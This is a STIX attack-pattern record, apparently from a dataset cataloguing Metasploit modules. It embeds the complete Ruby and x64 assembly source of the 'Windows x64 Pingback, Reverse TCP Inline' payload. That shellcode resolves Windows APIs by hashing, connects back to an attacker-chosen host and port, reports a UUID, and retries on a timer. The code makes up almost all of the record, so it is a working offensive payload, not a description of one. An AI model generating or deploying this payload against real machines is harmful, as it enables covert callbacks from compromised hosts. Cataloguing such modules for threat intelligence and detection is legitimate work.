{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--514b4dee-6078-45fb-9c0c-a74fffc83cba",
    "created": "2024-08-14T16:33:19.383795Z",
    "modified": "2024-08-14T16:33:19.383798Z",
    "name": "Windows x64 Pingback, Reverse TCP Inline",
    "description": "Connect back to attacker and report UUID (Windows x64)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/x64/pingback_reverse_tcp.rb",
            "external_id": "pingback_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 425\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n  include Msf::Payload::Pingback\n  include Msf::Payload::Pingback::Options\n  include Msf::Payload::Windows::BlockApi_x64\n  include Msf::Payload::Windows::Exitfunk_x64\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',\n      'Author'        => [ 'bwatters-r7' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::Pingback\n    ))\n\n    def required_space\n      # Start with our cached default generated size\n      space = cached_size\n\n      # EXITFUNK 'seh' is the worst case, that adds 15 bytes\n      space += 15\n\n      space\n    end\n\n    def generate(_opts = {})\n      # 22 -> \"0x00,0x16\"\n      # 4444 -> \"0x11,0x5c\"\n      encoded_port = [datastore['LPORT'].to_i, 2].pack(\"vn\").unpack(\"N\").first\n      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || \"127.127.127.127\").unpack(\"V\").first\n      encoded_host_port = \"0x%.8x%.8x\" % [encoded_host, encoded_port]\n      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max\n      pingback_count = datastore['PingbackRetries']\n      pingback_sleep = datastore['PingbackSleep']\n      self.pingback_uuid ||= self.generate_pingback_uuid\n      uuid_as_db = \"0x\" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(\",0x\")\n      conf = { exitfunk: datastore['EXITFUNC'] }\n\n\n      asm = %Q^\n        cld                     ; Clear the direction flag.\n        and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned\n        call start              ; Call start, this pushes the address of 'api_call' onto the stack.\n\n        api_call:\n          push r9                  ; Save the 4th parameter\n          push r8                  ; Save the 3rd parameter\n          push rdx                 ; Save the 2nd parameter\n          push rcx                 ; Save the 1st parameter\n          push rsi                 ; Save RSI\n          xor rdx, rdx             ; Zero rdx\n          mov rdx, [gs:rdx+96]     ; Get a pointer to the PEB\n          mov rdx, [rdx+24]        ; Get PEB->Ldr\n          mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list\n        next_mod:                  ;\n          mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)\n          movzx rcx, word [rdx+74] ; Set rcx to the length we want to check\n          xor r9, r9               ; Clear r9 which will store the hash of the module name\n        loop_modname:              ;\n          xor rax, rax             ; Clear rax\n          lodsb                    ; Read in the next byte of the name\n          cmp al, 'a'              ; Some versions of Windows use lower case module names\n          jl not_lowercase         ;\n          sub al, 0x20             ; If so normalise to uppercase\n        not_lowercase:             ;\n          ror r9d, 13              ; Rotate right our hash value\n          add r9d, eax             ; Add the next byte of the name\n          loop loop_modname        ; Loop untill we have read enough\n          ; We now have the module hash computed\n          push rdx                 ; Save the current position in the module list for later\n          push r9                  ; Save the current module hash for later\n          ; Proceed to itterate the export address table,\n          mov rdx, [rdx+32]        ; Get this modules base address\n          mov eax, dword [rdx+60]  ; Get PE header\n          add rax, rdx             ; Add the modules base address\n          cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?\n          ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and\n          ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).\n          ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])\n          jne get_next_mod1         ; if not, proceed to the next module\n          mov eax, dword [rax+136] ; Get export tables RVA\n          test rax, rax            ; Test if no export address table is present\n          jz get_next_mod1         ; If no EAT present, process the next module\n          add rax, rdx             ; Add the modules base address\n          push rax                 ; Save the current modules EAT\n          mov ecx, dword [rax+24]  ; Get the number of function names\n          mov r8d, dword [rax+32]  ; Get the rva of the function names\n          add r8, rdx              ; Add the modules base address\n          ; Computing the module hash + function hash\n        get_next_func:             ;\n          jrcxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module\n          dec rcx                  ; Decrement the function name counter\n          mov esi, dword [r8+rcx*4]; Get rva of next module name\n          add rsi, rdx             ; Add the modules base address\n          xor r9, r9               ; Clear r9 which will store the hash of the function name\n          ; And compare it to the one we want\n        loop_funcname:             ;\n          xor rax, rax             ; Clear rax\n          lodsb                    ; Read in the next byte of the ASCII function name\n          ror r9d, 13              ; Rotate right our hash value\n          add r9d, eax             ; Add the next byte of the name\n          cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)\n          jne loop_funcname        ; If we have not reached the null terminator, continue\n          add r9, [rsp+8]          ; Add the current module hash to the function hash\n          cmp r9d, r10d            ; Compare the hash to the one we are searchnig for\n          jnz get_next_func        ; Go compute the next function hash if we have not found it\n          ; If found, fix up stack, call the function and then value else compute the next one...\n          pop rax                  ; Restore the current modules EAT\n          mov r8d, dword [rax+36]  ; Get the ordinal table rva\n          add r8, rdx              ; Add the modules base address\n          mov cx, [r8+2*rcx]       ; Get the desired functions ordinal\n          mov r8d, dword [rax+28]  ; Get the function addresses table rva\n          add r8, rdx              ; Add the modules base address\n          mov eax, dword [r8+4*rcx]; Get the desired functions RVA\n          add rax, rdx             ; Add the modules base address to get the functions actual VA\n          ; We now fix up the stack and perform the call to the drsired function...\n        finish:\n          pop r8                   ; Clear off the current modules hash\n          pop r8                   ; Clear off the current position in the module list\n          pop rsi                  ; Restore RSI\n          pop rcx                  ; Restore the 1st parameter\n          pop rdx                  ; Restore the 2nd parameter\n          pop r8                   ; Restore the 3rd parameter\n          pop r9                   ; Restore the 4th parameter\n          pop r10                  ; pop off the return address\n          sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)\n                                   ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).\n          push r10                 ; push back the return address\n          jmp rax                  ; Jump into the required function\n          ; We now automagically return to the correct caller...\n        get_next_mod:              ;\n          pop rax                  ; Pop off the current (now the previous) modules EAT\n        get_next_mod1:             ;\n          pop r9                   ; Pop off the current (now the previous) modules hash\n          pop rdx                  ; Restore our position in the module list\n          mov rdx, [rdx]           ; Get the next module\n          jmp next_mod             ; Process this module\n\n        start:\n          pop rbp               ; block API pointer\n\n        reverse_tcp:\n        ; setup the structures we need on the stack...\n          mov r14, 'ws2_32'\n          push r14                ; Push the bytes 'ws2_32',0,0 onto the stack.\n          mov r14, rsp            ; save pointer to the \"ws2_32\" string for LoadLibraryA call.\n          sub rsp, #{408 + 8}     ; alloc sizeof( struct WSAData ) bytes for the WSAData\n                                  ; structure (+8 for alignment)\n          mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.\n          mov r12, #{encoded_host_port}\n          push r12                ; host, family AF_INET and port\n          mov r12, rsp            ; save pointer to sockaddr struct for connect call\n\n        ; perform the call to LoadLibraryA...\n          mov rcx, r14            ; set the param for the library to load\n          mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}\n          call rbp                ; LoadLibraryA( \"ws2_32\" )\n\n        ; perform the call to WSAStartup...\n          mov rdx, r13            ; second param is a pointer to this stuct\n          push 0x0101             ;\n          pop rcx                 ; set the param for the version requested\n          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}\n          call rbp                ; WSAStartup( 0x0101, &WSAData );\n\n        ; stick the retry count on the stack and store it\n          push #{retry_count}     ; retry counter\n          pop r14\n          push #{pingback_count}\n          pop r15\n\n        create_socket:\n        ; perform the call to WSASocketA...\n          push rax                ; if we succeed, rax wil be zero, push zero for the flags param.\n          push rax                ; push null for reserved parameter\n          xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure\n          xor r8, r8              ; we do not specify a protocol\n          inc rax                 ;\n          mov rdx, rax            ; push SOCK_STREAM\n          inc rax                 ;\n          mov rcx, rax            ; push AF_INET\n          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}\n          call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );\n          mov rdi, rax            ; save the socket for later\n\n        try_connect:\n        ; perform the call to connect...\n          push 16                 ; length of the sockaddr struct\n          pop r8                  ; pop off the third param\n          mov rdx, r12            ; set second param to pointer to sockaddr struct\n          mov rcx, rdi            ; the socket\n          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}\n          call rbp                ; connect( s, &sockaddr, 16 );\n\n          test eax, eax           ; non-zero means failure\n          jz connected\n\n        handle_connect_failure:\n          dec r14                 ; decrement the retry count\n          jnz try_connect\n          dec r15\n          jmp close_socket\n\n        failure:\n          call exitfunk\n\n        ; this  lable is required so that reconnect attempts include\n        ; the UUID stuff if required.\n        connected:\n\n        send_pingback:\n          xor r9, r9              ; flags\n          push #{uuid_as_db.split(\",\").length} ; length of the PINGBACK UUID\n          pop r8\n          call get_pingback_address  ; put uuid buffer on the stack\n          db #{uuid_as_db}  ; PINGBACK_UUID\n\n        get_pingback_address:\n          pop rdx                ; PINGBACK UUID address\n          mov rcx, rdi           ; Socket handle\n          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}\n          call rbp               ; call send\n\n        close_socket:\n          mov rcx, rdi           ; Socket handle\n          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}\n          call rbp               ; call closesocket\n        ^\n      if pingback_count > 0\n        asm << %Q^\n          sleep:\n            test r15, r15         ; check pingback retry counter\n            jz exitfunk           ; bail if we are at 0\n            dec r15               ;decrement the pingback retry counter\n            push #{(pingback_sleep * 1000)}            ; 10 seconds\n            pop rcx               ; set the sleep function parameter\n            mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}\n            call rbp              ; Sleep()\n            jmp create_socket     ; repeat callback\n        ^\n      end\n      if conf[:exitfunk]\n        asm << asm_exitfunk(conf)\n      end\n      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}